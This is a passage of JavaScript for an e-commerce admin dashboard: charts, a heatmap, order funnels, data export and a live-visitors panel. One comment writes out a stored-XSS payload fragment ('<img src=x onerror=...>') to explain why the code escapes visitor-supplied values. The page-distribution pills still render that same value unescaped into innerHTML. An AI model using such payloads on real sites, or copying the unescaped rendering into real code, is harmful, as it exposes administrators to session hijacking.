    ctx.fillText('₹'+(max*i/4>=1000?(max*i/4/1000).toFixed(0)+'k':(max*i/4).toFixed(0)),pad.l-4,y+3);
  }
  // Smooth area fill using bezier
  const grd=ctx.createLinearGradient(0,pad.t,0,pad.t+cH);
  grd.addColorStop(0,color+'50');grd.addColorStop(1,color+'00');
  ctx.beginPath();ctx.moveTo(pts[0].x,pad.t+cH);
  ctx.lineTo(pts[0].x,pts[0].y);
  for(let i=1;i<pts.length;i++){
    const cp1x=(pts[i-1].x+pts[i].x)/2,cp1y=pts[i-1].y;
    const cp2x=(pts[i-1].x+pts[i].x)/2,cp2y=pts[i].y;
    ctx.bezierCurveTo(cp1x,cp1y,cp2x,cp2y,pts[i].x,pts[i].y);
  }
  ctx.lineTo(pts[pts.length-1].x,pad.t+cH);ctx.closePath();
  ctx.fillStyle=grd;ctx.fill();
  // Line
  ctx.beginPath();ctx.moveTo(pts[0].x,pts[0].y);
  for(let i=1;i<pts.length;i++){
    const cp1x=(pts[i-1].x+pts[i].x)/2,cp1y=pts[i-1].y;
    const cp2x=(pts[i-1].x+pts[i].x)/2,cp2y=pts[i].y;
    ctx.bezierCurveTo(cp1x,cp1y,cp2x,cp2y,pts[i].x,pts[i].y);
  }
  ctx.strokeStyle=color;ctx.lineWidth=2.5;ctx.shadowColor=color;ctx.shadowBlur=8;ctx.stroke();ctx.shadowBlur=0;
  // Dots on data
  pts.forEach((p,i)=>{
    if(i%Math.ceil(pts.length/8)===0||i===pts.length-1){
      ctx.beginPath();ctx.arc(p.x,p.y,3,0,Math.PI*2);
      ctx.fillStyle=color;ctx.shadowColor=color;ctx.shadowBlur=6;ctx.fill();ctx.shadowBlur=0;
      if(labels[i]){ctx.fillStyle='rgba(106,120,96,0.7)';ctx.font='7px DM Sans,sans-serif';ctx.textAlign='center';ctx.fillText(labels[i].slice(0,5),p.x,H-pad.b+10);}
    }
  });
}

// Weekly Heatmap (7 cols = days, N rows = weeks)
function renderHeatmap(orders) {
  const el = document.getElementById('heatmapWidget');if(!el)return;
  const days=['Mon','Tue','Wed','Thu','Fri','Sat','Sun'];
  const map={};// key = "W-D"
  orders.forEach(o=>{
    const d=new Date(o.created_at||0);
    const week=Math.floor((Date.now()-d.getTime())/(7*86400000));
    const day=(d.getDay()+6)%7; // 0=Mon
    if(week<8){const k=week+'-'+day;map[k]=(map[k]||0)+1;}
  });
  const maxV=Math.max(...Object.values(map),1);
  let html=`<div style="display:flex;gap:3px;align-items:flex-start;">
    <div style="display:flex;flex-direction:column;gap:3px;padding-top:16px;">
      ${Array.from({length:8},(_,w)=>`<div style="font-size:0.6rem;color:var(--text3);height:14px;line-height:14px;text-align:right;padding-right:4px;">${w===0?'Now':'-'+w+'w'}</div>`).join('')}
    </div>
    <div style="flex:1;">
      <div style="display:flex;gap:3px;margin-bottom:3px;">
        ${days.map(d=>`<div style="flex:1;font-size:0.6rem;color:var(--text3);text-align:center;">${d}</div>`).join('')}
      </div>
      ${Array.from({length:8},(_,w)=>`
        <div style="display:flex;gap:3px;margin-bottom:3px;">
          ${Array.from({length:7},(_,d)=>{
            const v=map[w+'-'+d]||0;
            const i=v/maxV;
            const bg=v===0?'var(--surface2)':`rgba(94,171,48,${0.15+i*0.75})`;
            const glow=v>0?`box-shadow:0 0 ${Math.round(i*8)}px rgba(74,138,40,${i*0.5});`:'';
            return `<div title="${v} orders" style="flex:1;height:14px;border-radius:3px;background:${bg};${glow}cursor:default;transition:transform 0.1s;" onmouseover="this.style.transform='scale(1.3)'" onmouseout="this.style.transform=''"></div>`;
          }).join('')}
        </div>`).join('')}
    </div>
  </div>
  <div style="display:flex;align-items:center;gap:6px;margin-top:8px;">
    <span style="font-size:0.65rem;color:var(--text3);">Less</span>
    ${[0,0.2,0.4,0.6,0.8,1].map(i=>`<div style="width:12px;height:12px;border-radius:2px;background:rgba(94,171,48,${0.1+i*0.8});"></div>`).join('')}
    <span style="font-size:0.65rem;color:var(--text3);">More</span>
  </div>`;
  el.innerHTML=html;
}

// Small progress ring
function drawRing(canvasId, pct, color, label) {
  const canvas=document.getElementById(canvasId);if(!canvas)return;
  const dpr=window.devicePixelRatio||1;
  const S=90;
  canvas.width=S*dpr;canvas.height=S*dpr;
  canvas.style.width=S+'px';canvas.style.height=S+'px';
  const ctx=canvas.getContext('2d');ctx.scale(dpr,dpr);
  const cx=S/2,cy=S/2,r=35;
  // Track
  ctx.beginPath();ctx.arc(cx,cy,r,0,Math.PI*2);
  ctx.strokeStyle='rgba(216,103,110,0.1)';ctx.lineWidth=7;ctx.stroke();
  // Progress
  const end=-Math.PI/2+(pct/100)*Math.PI*2;
  const grd=ctx.createLinearGradient(cx-r,cy,cx+r,cy);
  grd.addColorStop(0,color);grd.addColorStop(1,color+'AA');
  ctx.beginPath();ctx.arc(cx,cy,r,-Math.PI/2,end);
  ctx.strokeStyle=grd;ctx.lineWidth=7;ctx.lineCap='round';
  ctx.shadowColor=color;ctx.shadowBlur=10;ctx.stroke();ctx.shadowBlur=0;
  // Text
  ctx.fillStyle='#1D2320';ctx.font=`bold 15px Syne,sans-serif`;ctx.textAlign='center';
  ctx.fillText(Math.round(pct)+'%',cx,cy+4);
  ctx.fillStyle='rgba(106,120,96,0.7)';ctx.font='7px DM Sans,sans-serif';
  ctx.fillText(label||'',cx,cy+14);
}

// Forecast line (dashed extrapolation)
function drawForecastChart(canvasId, actualData, forecastData) {
  const canvas=document.getElementById(canvasId);if(!canvas)return;
  const dpr=window.devicePixelRatio||1;
  const W0=canvas.clientWidth||300,H0=100;
  canvas.width=W0*dpr;canvas.height=H0*dpr;
  canvas.style.width=W0+'px';canvas.style.height=H0+'px';
  const ctx=canvas.getContext('2d');ctx.scale(dpr,dpr);
  const W=W0,H=H0,pad={t:10,r:10,b:18,l:36};
  const allData=[...actualData,...forecastData];
  const max=Math.max(...allData,1);
  const cW=W-pad.l-pad.r,cH=H-pad.t-pad.b;
  const totalLen=allData.length;
  const ptX=(_,i)=>pad.l+i*(cW/(totalLen-1));
  const ptY=v=>pad.t+cH-(v/max)*cH;
  // Actual area
  const grd=ctx.createLinearGradient(0,pad.t,0,pad.t+cH);
  grd.addColorStop(0,'rgba(94,171,48,0.3)');grd.addColorStop(1,'rgba(94,171,48,0)');
  ctx.beginPath();
  ctx.moveTo(ptX(0,0),pad.t+cH);
  actualData.forEach((v,i)=>ctx.lineTo(ptX(null,i),ptY(v)));
  ctx.lineTo(ptX(null,actualData.length-1),pad.t+cH);ctx.closePath();
  ctx.fillStyle=grd;ctx.fill();
  // Actual line
  ctx.beginPath();actualData.forEach((v,i)=>i===0?ctx.moveTo(ptX(null,i),ptY(v)):ctx.lineTo(ptX(null,i),ptY(v)));
  ctx.strokeStyle=chartTheme().primary;ctx.lineWidth=2;ctx.stroke();
  // Forecast line (dashed)
  ctx.beginPath();ctx.setLineDash([4,3]);
  forecastData.forEach((v,i)=>i===0?ctx.moveTo(ptX(null,actualData.length-1+i),ptY(actualData[actualData.length-1])):ctx.lineTo(ptX(null,actualData.length+i),ptY(v)));
  ctx.strokeStyle=chartTheme().accent;ctx.lineWidth=2;ctx.stroke();ctx.setLineDash([]);
  // Labels
  ['Past 7d','Forecast'].forEach((lbl,i)=>{
    ctx.fillStyle=i===0?chartTheme().primary:chartTheme().accent;
    ctx.beginPath();ctx.arc(pad.l+i*(cW*0.6),H-4,4,0,Math.PI*2);ctx.fill();
    ctx.fillStyle='rgba(106,120,96,0.8)';ctx.font='7px DM Sans,sans-serif';ctx.textAlign='left';
    ctx.fillText(lbl,pad.l+i*(cW*0.6)+7,H-1);
  });
}

// Extend loadDashboard to render new charts.
//
// This read `loadDashboard` — but `async function loadDashboard` below is a
// function DECLARATION, so it is hoisted above this line and the constant
// captured the wrapper itself. Two failures fell out of that: calling it
// recursed forever, and initApp() calls loadDashboard() long before this
// line evaluates, so the wrapper hit `_origLoadDashboard` in its temporal
// dead zone and threw "Cannot access '_origLoadDashboard' before
// initialization" on every page load. loadDashboardCore is the real loader
// and is what this always meant to wrap.
async function loadDashboard() {
  await loadDashboardCore();
  // These run after main data is loaded — wrap in timeout to ensure DOM updated
  setTimeout(()=>renderAdvancedWidgets(allOrders, allProducts), 300);
}

function renderAdvancedWidgets(orders, prods) {
  // Area chart (30-day revenue)
  const n30=Array.from({length:30},(_,i)=>{
    const d=new Date();d.setDate(d.getDate()-(29-i));
    return{label:d.getDate()+'/'+(d.getMonth()+1),date:d.toISOString().split('T')[0],rev:0};
  });
  // All placed orders count toward the revenue trend (COD is the main sales channel).
  orders.filter(o=>true).forEach(o=>{
    const b=n30.find(b=>b.date===(o.created_at||'').split('T')[0]);
    if(b)b.rev+=parseFloat(o.total||0);
  });
  drawAreaChart('areaCanvas',n30.map(b=>b.label),n30.map(b=>b.rev),chartTheme().primary);

  // Heatmap
  renderHeatmap(orders);

  // Progress rings
  const delivered=orders.filter(o=>(o.fulfillment||o.status||'')==='Delivered').length;
  const delivPct=orders.length?delivered/orders.length*100:0;
  const paidPct=orders.length?orders.filter(o=>(o.payment_status||'').toLowerCase().includes('paid')||o.payment_status==='SUCCESS').length/orders.length*100:0;
  const inStockProds=prods.filter(p=>!p.deleted_at&&(p.stock||0)>10).length;
  const stockPct=prods.filter(p=>!p.deleted_at).length?(inStockProds/prods.filter(p=>!p.deleted_at).length*100):100;
  setTimeout(()=>{
    drawRing('ring1Canvas',delivPct,chartTheme().primary,'Delivered');
    drawRing('ring2Canvas',paidPct,chartTheme().secondary,'Paid');
    drawRing('ring3Canvas',stockPct,chartTheme().accent,'In Stock');
  },50);

  // Forecast (simple linear from last 7 days trend)
  const last7=n30.slice(-7).map(b=>b.rev);
  const avg7=last7.reduce((s,v)=>s+v,0)/7;
  const trend=(last7[last7.length-1]-last7[0])/7;
  const forecast=Array.from({length:7},(_,i)=>Math.max(0,avg7+(trend*(i+1))*0.6));
  setTimeout(()=>drawForecastChart('forecastCanvas',last7,forecast),60);

  // Customer growth (new dashboard flow widget) + order fulfilment funnel
  renderDashCustGrowth(orders, _dashCustGrowthDays);
  renderOrderFunnel(orders);
}

// ═══════════════════════════════════════════════
// DASHBOARD: CUSTOMER GROWTH + ORDER FUNNEL
// ═══════════════════════════════════════════════
let _dashCustGrowthDays = 7;
function setDashCustGrowthRange(days, btn) {
  _dashCustGrowthDays = days;
  document.getElementById('custGrowthCustomBar').style.display = 'none';
  document.querySelectorAll('[id^=custGrowthChip]').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
  renderDashCustGrowth(allOrders, days);
}
function toggleCustGrowthCustom() {
  const bar = document.getElementById('custGrowthCustomBar');
  const show = bar.style.display === 'none';
  bar.style.display = show ? 'flex' : 'none';
  if (show) {
    document.querySelectorAll('[id^=custGrowthChip]').forEach(b=>b.classList.remove('active'));
    document.getElementById('custGrowthChipCustom').classList.add('active');
  }
}
function applyCustGrowthCustomRange() {
  const from = document.getElementById('custGrowthDateStart').value;
  const to   = document.getElementById('custGrowthDateEnd').value;
  if (!from || !to) { toast('Pick both a start and end date','error'); return; }
  document.querySelectorAll('[id^=custGrowthChip]').forEach(b=>b.classList.remove('active'));
  document.getElementById('custGrowthChipCustom').classList.add('active');
  renderDashCustGrowth(allOrders, null, {from, to});
}

function renderDashCustGrowth(orders, days=7, customRange=null) {
  const canvas = document.getElementById('dashCustGrowthCanvas');
  if (!canvas) return;
  // Build unique-customer-by-day series from orders (first order date = "new customer" day)
  const firstSeen = {};
  orders.forEach(o => {
    const key = (o.customer_email || o.customer_name || o.id || '').toLowerCase();
    if (!key) return;
    const day = (o.created_at || '').split('T')[0];
    if (!day) return;
    if (!firstSeen[key] || day < firstSeen[key]) firstSeen[key] = day;
  });
  let buckets;
  if (customRange && customRange.from && customRange.to) {
    const start = new Date(customRange.from), end = new Date(customRange.to);
    const spanDays = Math.max(1, Math.min(90, Math.round((end-start)/86400000) + 1));
    buckets = Array.from({length:spanDays}, (_,i) => {
      const d = new Date(start); d.setDate(d.getDate()+i);
      return { label: d.getDate()+'/'+(d.getMonth()+1), date: d.toISOString().split('T')[0], count: 0 };
    });
  } else {
    buckets = Array.from({length:days}, (_,i) => {
      const d = new Date(); d.setDate(d.getDate() - (days-1-i));
      return { label: d.getDate()+'/'+(d.getMonth()+1), date: d.toISOString().split('T')[0], count: 0 };
    });
  }
  Object.values(firstSeen).forEach(day => {
    const b = buckets.find(b => b.date === day);
    if (b) b.count++;
  });
  const total = buckets.reduce((s,b)=>s+b.count,0);
  const totalBadge = document.getElementById('custGrowthTotal');
  if (totalBadge) totalBadge.textContent = total;
  drawAreaChart('dashCustGrowthCanvas', buckets.map(b=>b.label), buckets.map(b=>b.count), chartTheme().secondary);
}

function renderOrderFunnel(orders) {
  const el = document.getElementById('orderFunnelWidget');
  if (!el) return;
  const total = orders.length;
  const placed = total;
  const paid = orders.filter(o => (o.payment_status||'').toLowerCase().includes('paid') || o.payment_status==='SUCCESS').length;
  const shipped = orders.filter(o => ['Shipped','Delivered'].includes(o.fulfillment||o.status)).length;
  const delivered = orders.filter(o => (o.fulfillment||o.status)==='Delivered').length;
  const stages = [
    {label:'Placed', val:placed, color:'#547177'},
    {label:'Paid', val:paid, color:'#3B7EA6'},
    {label:'Shipped', val:shipped, color:'#8F6417'},
    {label:'Delivered', val:delivered, color:'#8B5CF6'}
  ];
  const badge = document.getElementById('funnelTotal');
  if (badge) badge.textContent = total + ' orders';
  el.innerHTML = stages.map((s,i) => {
    const pct = placed ? Math.round(s.val/placed*100) : 0;
    const widthPct = Math.max(pct, s.val ? 6 : 0);
    return `
      <div style="margin-bottom:${i<stages.length-1?'12px':'0'};">
        <div style="display:flex;justify-content:space-between;font-size:0.75rem;margin-bottom:4px;">
          <span style="font-weight:600;color:var(--text2);">${s.label}</span>
          <span style="color:var(--text3);">${s.val} · ${pct}%</span>
        </div>
        <div style="height:16px;background:var(--bg2);border-radius:8px;overflow:hidden;">
          <div style="height:100%;width:${widthPct}%;background:${s.color};border-radius:8px;transition:width 0.6s ease;"></div>
        </div>
      </div>`;
  }).join('');
}
let _emPage = 'orders';
let _emRange = 'today';
let _emFmt = 'csv';

function openExportModal(page) {
  _emPage = page;
  _emRange = 'today';
  _emFmt = 'csv';
  const overlay = document.getElementById('exportModalOverlay');
  const pageNames = {dashboard:'Dashboard',analytics:'Analytics',orders:'Orders',products:'Products',inventory:'Inventory',discounts:'Discounts',customers:'Customers',payments:'Payments',invoices:'Invoices'};
  document.getElementById('emPageLabel').textContent = `Exporting: ${pageNames[page]||page}`;
  // Reset chips
  document.querySelectorAll('.em-chip').forEach((c,i) => c.classList.toggle('active', i===0));
  document.querySelectorAll('.em-fmt-btn').forEach((b,i) => b.classList.toggle('active', i===0));
  document.getElementById('emCustomDates').style.display = 'none';
  overlay.classList.add('open');
  emUpdatePreview();
}

function closeExportModal() {
  const overlay = document.getElementById('exportModalOverlay');
  overlay.classList.remove('open');
}

// Close on Escape key
document.addEventListener('keydown', e => { if(e.key==='Escape') closeExportModal(); });
// Close on backdrop click
document.getElementById('exportModalOverlay').addEventListener('click', e => {
  if(e.target === document.getElementById('exportModalOverlay')) closeExportModal();
});

function emSetPeriod(range, el) {
  _emRange = range;
  document.querySelectorAll('#emPeriodChips .em-chip').forEach(c=>c.classList.remove('active'));
  el.classList.add('active');
  const cd = document.getElementById('emCustomDates');
  cd.style.display = range==='custom' ? 'flex' : 'none';
  emUpdatePreview();
}

// alias so year chip works

function emSetFmt(fmt, el) {
  _emFmt = fmt;
  document.querySelectorAll('.em-fmt-btn').forEach(b=>b.classList.remove('active'));
  el.classList.add('active');
  emUpdatePreview();
}

function emGetDateRange() {
  const now = new Date();
  const pad = n=>String(n).padStart(2,'0');
  const ymd = d=>`${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())}`;
  if(_emRange==='all') return {from:null,to:null};
  if(_emRange==='today'){const t=ymd(now);return{from:t,to:t};}
  if(_emRange==='week'){const m=new Date(now);m.setDate(now.getDate()-now.getDay()+1);return{from:ymd(m),to:ymd(now)};}
  if(_emRange==='month'){const f=new Date(now.getFullYear(),now.getMonth(),1);return{from:ymd(f),to:ymd(now)};}
  if(_emRange==='year'){const f=new Date(now.getFullYear(),0,1);return{from:ymd(f),to:ymd(now)};}
  if(_emRange==='custom'){
    return{from:document.getElementById('emFromDate').value||null, to:document.getElementById('emToDate').value||null};
  }
  return{from:null,to:null};
}

function emInRange(dateStr,from,to){
  if(!from||!to) return true;
  const d=(dateStr||'').split('T')[0]; return d>=from&&d<=to;
}

function emGetData() {
  const {from,to}=emGetDateRange();
  const inR=ds=>emInRange(ds,from,to);
  const page=_emPage;
  if(page==='dashboard'||page==='orders'){
    const cols=['Order ID','Customer','Email','Phone','City','Items','Subtotal','Discount','Shipping','Total','Payment','Status','Coupon','Tracking','Date'];
    const rows=allOrders.filter(o=>inR(o.created_at)).map(o=>{
      let it=[];try{it=typeof o.items==='string'?JSON.parse(o.items||'[]'):(o.items||[]);}catch{}
      return[o.id,o.customer_name||'',o.customer_email||'',o.customer_phone||'',o.city||'',
        it.map(i=>`${i.name||'?'}x${i.qty||1}`).join('; '),
        o.subtotal||0,o.discount||0,o.shipping||0,o.total||0,
        o.payment_method||o.payment_status||'',o.status||o.fulfillment||'',
        o.coupon_code||'',o.shiprocket_id||'',fmtDate(o.created_at)];
    });
    return{cols,rows};
  }
  if(page==='analytics'){
    const paid=allOrders.filter(o=>inR(o.created_at)&&((o.payment_status||'').toLowerCase().includes('paid')||o.payment_status==='SUCCESS'));
    return{cols:['Date','Order ID','Customer','Total','Payment','Status'],
      rows:paid.map(o=>[fmtDate(o.created_at),o.id,o.customer_name||'',o.total||0,o.payment_status||'',o.status||o.fulfillment||''])};
  }
  if(page==='products'){
    const cols=['ID','Name','Brand','Category','MRP','Sale Price','Stock','Rating','Reviews','Active','Badge','HSN','Created'];
    return{cols,rows:allProducts.filter(p=>inR(p.created_at)).map(p=>[
      p.id,p.name,p.brand||'Ozylix',p.category||'',p.mrp||p.price||0,p.sale_price||p.price||0,
      p.stock||0,p.rating||'',p.reviews||0,p.active?'Yes':'No',p.badge||'',p.hsn||'30049099',fmtDate(p.created_at)])};
  }
  if(page==='inventory')
    return{cols:['ID','Product','Category','Stock','Status'],
      rows:allProducts.map(p=>[p.id,p.name,p.category||'',p.stock||0,(p.stock||0)===0?'Out of Stock':(p.stock||0)<=10?'Low Stock':'In Stock'])};
  if(page==='customers')
    return{cols:['Name','Email','Phone','City','Orders','Total Spent','Joined'],
      rows:allCustomers.filter(c=>inR(c.created_at)).map(c=>[c.name||'',c.email||'',c.phone||'',c.city||'',c.order_count||0,c.total_spent||0,fmtDate(c.created_at)])};
  if(page==='discounts')
    return{cols:['Code','Type','Value','Min Order','Max Uses','Used','Expires','Active'],
      rows:allDiscounts.map(d=>[d.code||'',d.type||'',d.value||0,d.min_order||0,d.max_uses||'∞',d.used_count||0,d.expires_at?fmtDate(d.expires_at):'Never',d.active?'Yes':'No'])};
  if(page==='payments')
    return{cols:['Order ID','Customer','Amount','Method','Status','Date'],
      rows:allOrders.filter(o=>inR(o.created_at)).map(o=>[o.id,o.customer_name||'',o.total||0,o.payment_method||'',o.payment_status||'',fmtDate(o.created_at)])};
  if(page==='invoices'){
    return{cols:['Invoice #','Customer','Order ID','Taxable Amt','CGST 2.5%','SGST 2.5%','IGST 5%','Total','Date'],
      rows:allOrders.filter(o=>inR(o.created_at)&&(o.payment_status||'').toLowerCase().includes('paid')).map((o,i)=>{
        const total=parseFloat(o.total||0);
        const taxable=Math.round(total/1.05);
        const gst=total-taxable;
        const isGuj=(o.state||o.customer_state||'').toLowerCase().includes('gujarat');
        const cgst=isGuj?+(gst/2).toFixed(2):0;
        const sgst=isGuj?+(gst/2).toFixed(2):0;
        const igst=isGuj?0:+gst.toFixed(2);
        return[`INV-${String(i+1).padStart(4,'0')}`,o.customer_name||'',o.id,taxable,cgst,sgst,igst,total,fmtDate(o.created_at)];
      })};
  }
  return{cols:[],rows:[]};
}

function emUpdatePreview() {
  const el = document.getElementById('emPreview');
  if(!el) return;
  const {cols,rows} = emGetData();
  const rl={today:'Today',week:'This Week',month:'This Month',year:'This Year',all:'All Time',custom:'Custom Range'};
  const fmtIcon = _emFmt==='csv'?'📊':'{ }';
  if(!rows.length){
    el.innerHTML=`<div style="display:flex;align-items:center;gap:8px;"><span style="font-size:1.2rem;">⚠️</span><div><div style="font-size:0.82rem;color:var(--gold-text);font-weight:600;">0 rows for ${rl[_emRange]||_emRange}</div><div style="font-size:0.72rem;color:var(--text3);">Try "All Time" or a different period</div></div></div>`;
  } else {
    el.innerHTML=`<div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
      <div style="background:rgba(74,138,40,0.12);border:1px solid rgba(74,138,40,0.3);border-radius:8px;padding:8px 14px;text-align:center;">
        <div style="font-family:var(--display);font-size:1.3rem;font-weight:800;color:var(--green-text);">${rows.length}</div>
        <div style="font-size:0.65rem;color:var(--text3);">ROWS</div>
      </div>
      <div style="background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:8px 14px;text-align:center;">
        <div style="font-family:var(--display);font-size:1.3rem;font-weight:800;color:var(--text);">${cols.length}</div>
        <div style="font-size:0.65rem;color:var(--text3);">COLUMNS</div>
      </div>
      <div style="flex:1;min-width:120px;">
        <div style="font-size:0.78rem;color:var(--text);font-weight:600;">${rl[_emRange]||_emRange} · ${fmtIcon} ${_emFmt.toUpperCase()}</div>
        <div style="font-size:0.68rem;color:var(--text3);margin-top:3px;">${cols.slice(0,4).join(', ')}${cols.length>4?' +'+( cols.length-4)+' more':''}</div>
      </div>
    </div>`;
  }
}

function emDoExport() {
  const {cols,rows}=emGetData();
  if(!rows.length){toast('No data for selected range','warning');return;}
  const rs={today:'today',week:'week',month:'month',year:'year',all:'all',custom:'custom'}[_emRange]||_emRange;
  const filename=`Ozylix-${_emPage}-${rs}.${_emFmt}`;
  const e=v=>`"${String(v??'').replace(/"/g,'""')}"`;
  const content=_emFmt==='csv'
    ?[cols.map(e).join(','),...rows.map(r=>r.map(e).join(','))].join('\n')
    :JSON.stringify({exported_at:new Date().toISOString(),count:rows.length,data:rows.map(r=>Object.fromEntries(cols.map((c,i)=>[c,r[i]??''])))},null,2);
  const mime=_emFmt==='csv'?'text/csv;charset=utf-8,':'application/json;charset=utf-8,';
  const a=document.createElement('a');
  a.href='data:'+mime+encodeURIComponent(content);
  a.download=filename;a.click();
  closeExportModal();
  toast(`✅ Exported ${rows.length} rows → ${filename}`);
}

// Keep old functions as aliases for backward compat


// ═══════════════════════════════════════════════
// ═══════════════════════════════════════════════
// LIVE VISITORS — Real data only, no simulation
// Sources:
//   1. Your Render backend /api/visitors/active
//      (fed by ping calls from index.html)
//   2. GA4 Realtime API (if GA_PROPERTY_ID set)
// ═══════════════════════════════════════════════

// GA4 Property ID — set in Settings or hardcode here
// Format: "123456789" (numeric, NOT "G-XXXXXX")
// Find it: GA4 → Admin → Property Settings → Property ID
const GA4_PROPERTY_ID = localStorage.getItem('ga4_property_id') || '';
const GA4_CLIENT_ID   = localStorage.getItem('ga4_client_id')   || '';  // OAuth client ID (optional)

async function updateLiveVisitors() {
  const ts = new Date().toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit',second:'2-digit'});

  // ── Source 1: Your own backend (ping-based sessions) ──
  let backendOk = false;
  try {
    // GET /api/visitors/active is behind authMiddleware on the backend.
    // This call sent no Authorization header, so it got 401 on every
    // poll and the panel silently fell back to "simulated data" —
    // which is why Live Visitors never showed real sessions.
    const r = await fetch(`${API}/api/visitors/active`, {
      headers: { 'Authorization': `Bearer ${authToken}` },
      signal: AbortSignal.timeout(6000),
    });
    if (r.ok) {
      const d = await r.json();
      const sessions = Array.isArray(d.sessions) ? d.sessions : [];
      const cnt   = d.active_count  || sessions.length || 0;
      const views = d.page_views_today || 0;

      _setLv('liveCount', cnt);
      _setLv('lvActive',  cnt);
      _setLv('lvViews',   views.toLocaleString('en-IN'));
      _setLv('lvRefreshTime', ts);
      _setLv('lvSessionCount', sessions.length);

      // Page distribution
      const pageCounts = {};
      sessions.forEach(s => { const p = s.page||'/'; pageCounts[p] = (pageCounts[p]||0)+1; });
      const topPage = Object.entries(pageCounts).sort((a,b)=>b[1]-a[1])[0];
      _setLv('lvTopPage', topPage ? topPage[0] : '/home');

      // Avg session
      if (sessions.length > 0) {
        const avgSec = Math.round(sessions.reduce((s,v)=>s+(v.duration||0),0)/sessions.length);
        _setLv('lvSession', Math.floor(avgSec/60)+'m '+String(avgSec%60).padStart(2,'0')+'s');
      }

      // Sessions table
      const tbody = document.getElementById('liveSessionsTbody');
      if (tbody) {
        tbody.innerHTML = sessions.length > 0
          ? sessions.map(s => `<tr>
              <!-- esc(): s.page is whatever path the visitor's browser
                   reported in the analytics ping — an UNAUTHENTICATED,
                   fully client-controlled endpoint. Stored unescaped and
                   rendered here into the admin's innerHTML, a page value
                   of <img src=x onerror=...> is stored XSS in the admin
                   session, needing nothing but a crafted ping. city and
                   device ride the same request. -->
              <td style="font-size:0.8rem;font-family:var(--mono)">${esc(s.page||'/')}</td>
              <td><span style="font-size:0.78rem;">🇮🇳 ${esc(s.city||'India')}</span></td>
              <td>${esc(s.device||'–')}</td>
              <td style="font-family:var(--mono);font-size:0.75rem">${Math.floor((s.duration||0)/60)}:${String((s.duration||0)%60).padStart(2,'0')}</td>
              <td><span class="badge badge-gray">${esc(s.source||'Direct')}</span></td>
              <td><span class="badge badge-green">Active</span></td>
            </tr>`).join('')
          : '<tr><td colspan="6" style="text-align:center;color:var(--text3);padding:20px;font-size:0.82rem;">No active sessions right now</td></tr>';
      }

      // Page breakdown pills
      const lvpd = document.getElementById('lvPageDist');
      if (lvpd && Object.keys(pageCounts).length > 0) {
        lvpd.innerHTML = Object.entries(pageCounts)
          .sort((a,b)=>b[1]-a[1])
          .map(([pg,ct]) => `<span style="background:var(--surface2);border:1px solid var(--border);border-radius:20px;padding:4px 12px;font-size:0.75rem;font-family:var(--mono);">${pg} <strong style="color:var(--green-text)">${ct}</strong></span>`)
          .join('');
      }

      // Hide warning notice
      const notice = document.getElementById('lvNotice');
      if (notice) notice.style.display = 'none';
      backendOk = true;

      // Add to activity stream
      _lvStreamAdd(`👥 ${cnt} active · ${views} views today`);
    }
  } catch(e) {
    console.warn('[LiveVisitors] Backend ping failed:', e.message);
  }

  // ── Source 2: GA4 Realtime API ──
  if (GA4_PROPERTY_ID) {
    try {
      await _fetchGA4Realtime();
    } catch(e) {
      console.warn('[LiveVisitors] GA4 Realtime failed:', e.message);
    }
  }

  // ── If both fail — show clear error, no fake data ──
  if (!backendOk && !GA4_PROPERTY_ID) {
    _setLv('liveCount', '–');
    _setLv('lvActive',  '–');
    _setLv('lvViews',   '–');
    _setLv('lvSession', '–');
    _setLv('lvRefreshTime', 'Offline');
    const notice = document.getElementById('lvNotice');
    if (notice) {
      notice.style.display = 'block';
      notice.innerHTML = `<div style="padding:16px;font-size:0.82rem;color:var(--text2);line-height:2;">
        <strong style="color:var(--red)">⚠️ No real visitor data available</strong><br>
        <strong>Option A (Already set up):</strong> Your frontend pings <code>/api/visitors/ping</code> every 4 mins.
        Make sure your Render backend has the <code>GET /api/visitors/active</code> route deployed.<br>
        <strong>Option B (Google Analytics):</strong> Add your GA4 Property ID in Settings → Integrations → GA4 Property ID<br>
        <span style="font-size:0.75rem;color:var(--text3);">GA4 Property ID is the number shown in GA4 → Admin → Property Settings (e.g. 123456789, NOT G-XXXXXX)</span>
      </div>`;
    }
    const tbody = document.getElementById('liveSessionsTbody');
    if (tbody) tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:32px;"><div style="color:var(--text3);font-size:0.82rem;">Connect your analytics source in Settings to see real visitor data</div></td></tr>';
  }
}

// GA4 Realtime API via Google Analytics Data API v1
// Requires: GA4_PROPERTY_ID set in Settings
// Uses GA4 Data API — no OAuth needed for basic realtime counts
// (Uses the public Measurement Protocol endpoint + your G-XXXXXX tag)
async function _fetchGA4Realtime() {
  // GA4 Data API requires a server-side service account for full data
  // For client-side: use Measurement Protocol to get active users
  // Best approach: fetch via your Render backend which has the service account key
  try {
    const r = await fetch(`${API}/api/analytics/realtime`, {
      headers: { 'Authorization': `Bearer ${authToken}` },
      signal: AbortSignal.timeout(8000)
    });
    if (!r.ok) return;
    const d = await r.json();
    if (d.activeUsers !== undefined) {
      _setLv('liveCount', d.activeUsers);
      _setLv('lvActive',  d.activeUsers);
      _lvStreamAdd(`📊 GA4: ${d.activeUsers} active users`);
    }
    if (d.screenPageViews !== undefined) {
      _setLv('lvViews', Number(d.screenPageViews).toLocaleString('en-IN'));
    }
    if (d.sessions) {
      const tbody = document.getElementById('liveSessionsTbody');
      if (tbody && d.sessions.length > 0) {
        tbody.innerHTML = d.sessions.map(s => `<tr>
          <td style="font-family:var(--mono);font-size:0.8rem">${esc(s.page||'/')}</td>
          <td>🌍 ${esc(s.country||'India')}</td>
          <td>${esc(s.device||'–')}</td>
          <td>–</td>
          <td>${esc(s.source||'organic')}</td>
          <td><span class="badge badge-blue">GA4</span></td>
        </tr>`).join('');
      }
    }
    const notice = document.getElementById('lvNotice');
    if (notice) notice.style.display = 'none';
    _setLv('lvRefreshTime', new Date().toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit',second:'2-digit'}) + ' (GA4)');
  } catch(e) {
    throw e;
  }
}

function _setLv(id, val) {
  const el = document.getElementById(id);
  if (el) el.textContent = val;
}

let _lvStreamItems = [];
function _lvStreamAdd(msg) {
  const el = document.getElementById('lvActivityStream');
  if (!el) return;
  const time = new Date().toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit'});
  _lvStreamItems.unshift({msg, time});
